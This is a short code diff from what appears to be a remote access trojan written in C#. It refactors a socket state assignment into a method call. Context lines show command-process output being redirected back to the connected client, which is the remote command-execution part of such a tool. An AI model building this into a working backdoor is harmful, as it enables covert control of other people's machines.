@@ -56,7 +56,7 @@ namespace RAT.src.Sockets.Connection
                 },
             };
 
-            _socketStateLogic.se = clientState;
+            _socketStateLogic.SetState(clientState);
 
             // Cmd output handler which will redirect output and error result to client after command is executed.
             clientState.ClientCmdProcess.OutputDataReceived += new DataReceivedEventHandler(_cmdLogic.CmdOutputDataHandler);
